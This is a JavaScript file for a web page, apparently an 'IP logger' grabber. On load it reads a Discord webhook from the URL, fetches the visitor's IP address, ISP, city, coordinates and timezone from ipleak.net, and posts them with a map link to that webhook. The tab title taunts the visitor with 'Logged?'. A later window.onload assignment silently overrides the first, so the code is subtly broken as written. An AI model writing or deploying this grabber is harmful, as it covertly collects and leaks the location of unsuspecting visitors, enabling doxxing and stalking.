window.onload = async function() {
  // Get the query string parameters
  const urlParams = new URLSearchParams(window.location.search);

  // Check if 'webhook' parameter exists in the URL
  const webhookUrl = urlParams.get('webhook');

  if (webhookUrl && webhookUrl.includes("discord.com/api/webhooks")) {
    // If a valid webhook URL is found, send the visitor information
    await sendVisitorInfoToWebhook(webhookUrl);
  } else {
    console.error("Invalid or missing webhook URL.");
  }
};

async function sendVisitorInfoToWebhook(webhookUrl) {
  try {
    const response = await fetch('https://ipleak.net/json/');

    if (!response.ok) {
      console.error('Failed to fetch visitor data:', response.statusText);
      return;
    }

    const visitorData = await response.json();
    if (!visitorData) return;

    const visitorInfo = {
      ip: visitorData.ip || "Unknown",
      isp: visitorData.isp_name || "Unknown",
      asn: visitorData.as_number || "Unknown",
      country: visitorData.country_name || "Unknown",
      countryCode: visitorData.country_code || "Unknown",
      region: visitorData.region_name || "Unknown",
      regionCode: visitorData.region_code || "Unknown",
      city: visitorData.city_name || "Unknown",
      timezone: visitorData.time_zone || "Unknown",
      latitude: visitorData.latitude || 0,
      longitude: visitorData.longitude || 0,
      accuracyRadius: visitorData.accuracy_radius || "Unknown",
      mapLink: `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}`,
      queryDate: new Date(visitorData.query_date * 1000 || Date.now()).toLocaleString(),
    };

    const embed = {
      title: "HeptaByte Info from recent request on site.",
      color: 0x000000,
      fields: [
        { name: "IP", value: visitorInfo.ip, inline: true },
        { name: "ISP", value: visitorInfo.isp, inline: true },
        { name: "ASN", value: visitorInfo.asn.toString(), inline: true },
        { name: "Country", value: `${visitorInfo.country} (${visitorInfo.countryCode})`, inline: true },
        { name: "Region", value: `${visitorInfo.region} (${visitorInfo.regionCode})`, inline: true },
        { name: "City", value: visitorInfo.city, inline: true },
        { name: "Time Zone", value: visitorInfo.timezone, inline: true },
        { name: "Latitude & Longitude", value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`, inline: true },
        { name: "Accuracy Radius", value: `${visitorInfo.accuracyRadius} KM`, inline: true },
        { name: "Geolocation Map", value: `[Activate](${visitorInfo.mapLink})`, inline: false },
        { name: "Last Data Update", value: visitorInfo.queryDate, inline: false },
      ]
    };

    const webhookResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] }),
    });

    if (webhookResponse.ok) {
      console.log('Visitor info sent successfully!');
    } else {
      console.error('Failed to send data to Discord webhook:', webhookResponse.statusText);
    }
  } catch (error) {
    console.error('Unexpected error:', error.message);
  }
}

const originalTitle = "Logged?";
const deleteSpeed = 300; 
const typingSpeed = 300;

let titleIndex = 0;
let titleDeleteIndex = originalTitle.length;

function typeTitle() {
    if (titleIndex < originalTitle.length) {
        document.title += originalTitle.charAt(titleIndex);
        titleIndex++;
        setTimeout(typeTitle, typingSpeed);
    } else {
        setTimeout(deleteTitle, 0);
    }
}

function deleteTitle() {
    if (titleDeleteIndex >= 1) {
        document.title = document.title.slice(0, titleDeleteIndex);
        titleDeleteIndex--;
        setTimeout(deleteTitle, deleteSpeed);
    } else {
        titleIndex = 1;
        titleDeleteIndex = originalTitle.length;
        setTimeout(typeTitle, 0);
    }
}

window.onload = () => {
    typeTitle();
};
